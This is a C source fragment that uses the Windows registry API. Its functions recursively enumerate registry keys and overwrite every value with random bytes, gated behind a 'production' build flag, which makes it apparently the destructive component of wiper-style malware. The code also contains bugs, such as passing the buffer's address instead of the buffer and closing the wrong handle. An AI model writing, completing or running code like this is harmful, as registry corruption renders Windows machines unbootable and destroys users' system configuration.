BOOL PsCorruptKey(HKEY hLoc, LPCWSTR directory, LPCWSTR keyName) {
	HKEY hk;
	DWORD pcbData = 0;
	DWORD dwType;
	BYTE* pbData = NULL;

	//wprintf(L"Corrupting %ls:%ls\n", directory, keyName);
	//Sleep(1);
	
	if (RegOpenKeyExW(hLoc, directory, 0, KEY_ALL_ACCESS, &hk) != ERROR_SUCCESS)
		return FALSE;
	if (RegGetValueW(hk, NULL, keyName, RRF_RT_ANY, &dwType, NULL, &pcbData) != ERROR_SUCCESS) {
		RegCloseKey(hk);
		return FALSE;
	} 
	if (!pcbData) {
		RegCloseKey(hk);
		return TRUE; // empty value
	}
	pbData = malloc(pcbData);
	if (!pbData) {
		RegCloseKey(hk);
		return FALSE;
	}
	
	if (RegGetValueW(hk, NULL, keyName, RRF_RT_ANY, &dwType, pbData, &pcbData) != ERROR_SUCCESS) {
		RegCloseKey(hk);
		free(pbData);
		return FALSE;
	}

	for (DWORD i = 0; i < pcbData; i++)
		pbData[i] = rand() % 256;

	if (RegSetValueExW(hk, keyName, 0, dwType, (const BYTE*)&pbData, pcbData) != ERROR_SUCCESS) {
		RegCloseKey(hk);
		free(pbData);
		return FALSE;
	}

	free(pbData);
	RegCloseKey(hLoc);
	return TRUE;
}
BOOL PsCorruptValues(HKEY hLoc, LPCWSTR lpSubKey) {
	HKEY hKey;
	DWORD dwIndex = 0;
	if (RegOpenKeyExW(hLoc, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return FALSE;

	PsCorruptKey(hKey, lpSubKey, NULL);

	DWORD dwSz = REG_VALUE_MAX_SIZE + 1;
	LPWSTR lpName = malloc(sizeof(WCHAR) * dwSz);

	while (RegEnumValueW(hKey, dwIndex, lpName, &dwSz, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
		PsCorruptKey(hLoc, lpSubKey, lpName);
		dwIndex++;
	}
	free(lpName);
	RegCloseKey(hKey);
	return TRUE;
}
BOOL PsCorruptSubKeys(HKEY hLoc, LPCWSTR lpSubKey) {
	#if PS_MODE != PRODUCTION
		return FALSE;
	#endif
	HKEY hKey;
	DWORD dwIndex = 0;
	DWORD err = 0;
	DWORD skLen = (DWORD)wcslen(lpSubKey);
	if (RegOpenKeyExW(hLoc, lpSubKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return FALSE;

	PsCorruptKey(hKey, lpSubKey, NULL);
	PsCorruptValues(hKey, lpSubKey);

	DWORD dwSz = 0, dwSzClone = 0;
	if (ERROR_SUCCESS !=
		RegQueryInfoKeyW(hKey, NULL, NULL, NULL, NULL, &dwSz, NULL, NULL, NULL, NULL, NULL, NULL)
		) {
		RegCloseKey(hKey);
		return FALSE;
	}
	dwSz++;
	LPWSTR lpName = malloc(sizeof(WCHAR) * dwSz);
	DWORD resz = 1 + dwSz + skLen;
	LPWSTR res = malloc(sizeof(WCHAR) * resz);
	dwSzClone = dwSz;
	if (!lpName) {
		if (res)
			free(res);
		RegCloseKey(hKey);
		return FALSE;
	}
	if (!res) {
		RegCloseKey(hKey);
		return FALSE;
	}
	BOOL bIsEmpty = lpSubKey[0] == '\0';
	if (bIsEmpty)
		free(res);
	
	while ((err=RegEnumKeyExW(hKey, dwIndex, lpName, &dwSzClone, NULL, NULL, NULL, NULL)) == ERROR_SUCCESS) {
		if (!bIsEmpty)
			StringCchPrintfW(res, resz, L"%ls\\%ls", lpSubKey, lpName);
		else
			res = lpName;
		if (wcscmp(res, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData")) {
			PsCorruptSubKeys(hLoc, res);
			PsCorruptValues(hLoc, res);
		}
		dwIndex++;
		ZeroMemory(lpName, dwSz * 2);
		dwSzClone = dwSz;
	}
	RegCloseKey(hKey);
	if (!bIsEmpty)
		free(res);
	free(lpName);
	//MsgError(err);
	return TRUE;
}
